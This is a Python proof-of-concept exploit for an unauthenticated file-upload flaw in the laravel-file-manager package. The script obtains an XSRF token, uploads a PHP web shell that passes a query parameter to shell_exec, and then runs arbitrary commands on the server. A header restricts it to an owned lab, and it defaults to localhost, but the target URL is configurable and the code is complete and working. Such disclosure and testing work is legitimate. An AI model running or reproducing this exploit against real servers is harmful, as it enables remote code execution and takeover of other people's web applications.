#!/usr/bin/env python3
"""
PoC - alexusmai/laravel-file-manager: unauthenticated PHP upload -> RCE

Intended ONLY for an isolated lab that you own or are explicitly authorised
to test. Default target is a local Docker instance.

Preconditions reproduced by lab/:
  * package configuration left at its published defaults:
      - middleware  => ['web']      (no auth)
      - allowFileTypes => []        (no extension restriction)
      - acl         => false
      - diskList    => ['public']
  * php artisan storage:link has been executed
  * the web server executes .php files under public/storage

Flow:
  1. GET  /file-manager/initialize  -> confirms signature + obtains XSRF cookie
  2. POST /file-manager/upload      -> stores <name>.php on the public disk
  3. GET  /storage/<name>.php?c=... -> executes the payload
"""
import argparse
import http.cookiejar
import json
import os
import re
import secrets
import sys
import urllib.error
import urllib.parse
import urllib.request

BANNER = "LFM-POC:"
PAYLOAD = '<?php echo "LFM-POC:"; $c=$_GET["c"]??"id"; echo shell_exec($c); ?>'


def build_opener():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar)), jar


def cookie_value(jar, name):
    for cookie in jar:
        if cookie.name == name:
            return cookie.value
    return None


def multipart(fields, files):
    boundary = "----lfm" + secrets.token_hex(12)
    body = bytearray()
    for key, value in fields.items():
        body += f"--{boundary}\r\n".encode()
        body += f'Content-Disposition: form-data; name="{key}"\r\n\r\n'.encode()
        body += f"{value}\r\n".encode()
    for key, filename, content in files:
        body += f"--{boundary}\r\n".encode()
        body += (
            f'Content-Disposition: form-data; name="{key}"; filename="{filename}"\r\n'
        ).encode()
        body += b"Content-Type: application/x-php\r\n\r\n"
        body += content + b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    return bytes(body), f"multipart/form-data; boundary={boundary}"


def request(opener, url, data=None, headers=None, method=None):
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    try:
        with opener.open(req, timeout=20) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read()


def main():
    parser = argparse.ArgumentParser(description="Local-lab PoC for laravel-file-manager upload RCE")
    parser.add_argument("--base-url", default="http://127.0.0.1:18080")
    parser.add_argument("--prefix", default="file-manager")
    parser.add_argument("--disk", default="public")
    parser.add_argument("--cmd", default="id")
    parser.add_argument("--name", default=None)
    args = parser.parse_args()

    base = args.base_url.rstrip("/")
    name = args.name or f"lfm_poc_{secrets.token_hex(4)}.php"
    opener, jar = build_opener()

    print(f"[*] target        : {base}")
    print(f"[*] package route : /{args.prefix}/initialize")

    status, body = request(opener, f"{base}/{args.prefix}/initialize")
    if status != 200:
        print(f"[-] initialize returned HTTP {status}; target is not a reachable instance")
        return 2
    try:
        info = json.loads(body)
    except json.JSONDecodeError:
        print("[-] initialize did not return JSON; not the expected component")
        return 2

    config = info.get("config", {})
    print(f"[+] initialize OK : acl={config.get('acl')} disks={list(config.get('disks', {}))}")
    if config.get("acl") is True:
        print("[!] ACL is enabled; requests may be further restricted")

    xsrf = cookie_value(jar, "XSRF-TOKEN")
    if not xsrf:
        print("[-] no XSRF-TOKEN cookie issued; cannot satisfy CSRF")
        return 2

    data, content_type = multipart(
        {"disk": args.disk, "path": "", "overwrite": "1"},
        [("files[]", name, PAYLOAD.encode())],
    )

    upload_status, upload_body = None, b""
    for token in (urllib.parse.unquote(xsrf), xsrf):
        headers = {"X-XSRF-TOKEN": token, "Content-Type": content_type, "Accept": "application/json"}
        upload_status, upload_body = request(
            opener, f"{base}/{args.prefix}/upload", data=data, headers=headers
        )
        if upload_status != 419:
            break

    print(f"[*] upload        : HTTP {upload_status} {upload_body.decode(errors='replace')[:200]}")
    if upload_status != 200:
        print("[-] upload rejected (authenticated-only, restricted types, or CSRF mismatch)")
        return 1
    try:
        result = json.loads(upload_body).get("result", {})
    except json.JSONDecodeError:
        result = {}
    if result.get("status") != "success":
        print(f"[-] upload status is not success: {result}")
        return 1

    url = f"{base}/storage/{urllib.parse.quote(name)}?c={urllib.parse.quote(args.cmd)}"
    exec_status, exec_body = request(opener, url)
    text = exec_body.decode(errors="replace")
    print(f"[*] execute       : GET /storage/{name} -> HTTP {exec_status}")

    if BANNER in text:
        print("[+] RCE CONFIRMED")
        print("[+] command output:")
        print(text.split(BANNER, 1)[1].strip())
        return 0

    print("[-] file was stored but did not execute (check storage:link / PHP handler / disk)")
    print(text[:400])
    return 1


if __name__ == "__main__":
    sys.exit(main())
